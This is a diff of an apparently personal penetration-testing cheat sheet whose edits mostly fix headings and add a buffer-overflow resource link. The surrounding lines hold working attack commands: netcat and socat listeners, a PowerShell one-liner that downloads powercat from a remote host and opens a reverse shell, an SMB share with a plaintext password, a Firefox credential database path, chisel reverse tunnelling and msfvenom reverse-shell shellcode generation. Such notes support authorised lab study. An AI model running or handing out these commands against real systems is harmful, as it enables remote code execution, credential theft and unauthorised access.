@@ -1,4 +1,12 @@
-# netcat
+# RESOURCES
+## buffer overflow
+#### x86 cheat sheet
+https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf
+
+
+
+# COMMANDS
+## netcat
 #### file transfer
 target machine
 `nc -nlvp 9001 > incoming.exe`
@@ -18,7 +26,7 @@ target
 local
 `nc -lnvp 9001`
 
-##socat
+## socat
 #### connecting
 `socat - TCP4:10.11.0.22:110`
 
@@ -75,7 +83,7 @@ download file
 download a file and execute from memory with powercat
 `IEX(New-Object System.Net.Webclient).DownloadString('http://10.1.1.1:8000/powercat.ps1');powercat -c 10.1.1.1 -p 8001 -e powershell.exe`
 
-###smb
+### smb
 localhost
 `sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1
 
@@ -86,18 +94,18 @@ New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\10.10.1
 cd dials:
 ```
 
-###credentials
+### credentials
 ```
 C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release\key4.db
 ```
 sharpweb?
 python cracker?
 
-###file transfer
+### file transfer
 
 
 
-## chisel
+### chisel
 \*nix local
 `./chisel server --reverse -p 9001`
 
@@ -106,7 +114,7 @@ win remote
 
 
 
-## msfvenom
+### msfvenom
 generate shellcode, filtering out bad characters
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
 
